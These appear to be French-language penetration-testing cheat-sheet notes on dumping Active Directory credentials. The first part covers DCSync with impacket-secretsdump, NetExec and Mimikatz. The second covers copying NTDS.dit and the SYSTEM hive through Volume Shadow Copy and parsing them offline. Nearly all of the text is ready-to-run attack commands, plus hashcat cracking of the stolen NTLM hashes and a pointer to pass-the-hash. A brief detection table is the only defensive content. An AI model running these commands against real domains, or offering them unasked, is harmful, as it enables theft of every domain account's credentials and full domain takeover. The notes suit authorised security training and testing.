# DCSync

Imite un DC pour demander la réplication des credentials d'un utilisateur via l'API `IDL_DRSGetNCChanges` (protocole DRS). Le DC cible ne vérifie pas si la demande vient d'un vrai DC -  seulement que le SID a les droits requis.

**Droits requis** : `Replicating Directory Changes` + `Replicating Directory Changes All`. Par défaut : membres de **Domain Admins**, **Enterprise Admins**, **Administrators**.

**Depuis Kali (impacket-secretsdump)**

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@IP_DC

# Dump tous les comptes
impacket-secretsdump corp.com/jeffadmin:'PASSWORD'@IP_DC
```

**Depuis Kali (NetExec)**

```bash
nxc smb 'IP_DC' -u ''USER'' -p ''PASSWORD'' --ntds
```

**Depuis Windows (Mimikatz)**

```
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
```

**Cracker le hash NTLM obtenu (mode 1000)**

```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> Les hashes NTLM obtenus par DCSync peuvent aussi être utilisés directement en **Pass-the-Hash** sans avoir à les craquer (voir Lateral Movement).

---
# Shadow Copies (NTDS.dit)

Deux méthodes pour extraire tous les hashes du domaine :

| Méthode | Accès fichier | Protocole | Détection |
|---|---|---|---|
| **DCSync** (défaut) | Non -  réseau uniquement | DRSUAPI (réplication AD) | Trafic de réplication depuis un non-DC suspect |
| **VSS** (`-use-vss`) | Oui -  snapshot disque | SMB + VSS | Création de shadow copy visible dans les logs |

**Pourquoi VSS :** `NTDS.dit` est verrouillé en permanence par Windows tant que le DC tourne. VSS crée un snapshot frozen du disque -  depuis ce snapshot, le fichier n'est plus verrouillé et peut être copié. `NTDS.dit` est chiffré avec une clé dans `HKLM\SYSTEM`, il faut donc exporter la ruche SYSTEM en même temps pour le déchiffrer offline.

**Kali**

```bash
# VSS method -  crée la shadow copy à distance et parse NTDS.dit
impacket-secretsdump -use-vss corp.com/'DA_USER':'PASSWORD'@'IP_DC'

# ou via nxc
nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds vss

# Sans VSS -  DCSync direct (plus rapide, pas de shadow copy)
impacket-secretsdump corp.com/'DA_USER':'PASSWORD'@'IP_DC'
nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
```

**Windows**
https://github.com/GossiTheDog/HiveNightmare
```cmd
:: Sur le DC -  créer la shadow copy
vshadow.exe -nw -p C:
:: → noter le "Shadow copy device name" dans l'output

:: Copier NTDS.dit depuis la shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

:: Exporter la ruche SYSTEM
reg.exe save hklm\system c:\system.bak
```

Autres méthodes 

```powershell
# Créer un shadow copy
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
$id = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate | Select-Object -Last 1).DeviceObject

# Copier depuis le shadow
cmd /c "copy `"$id\Windows\System32\config\SYSTEM`" C:\Users\offsec\SYSTEM"
```

Ou via `reg save` :

```cmd
reg save HKLM\SYSTEM C:\Users\offsec\SYSTEM.hiv
```

Transférer les deux fichiers sur Kali puis parser :

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

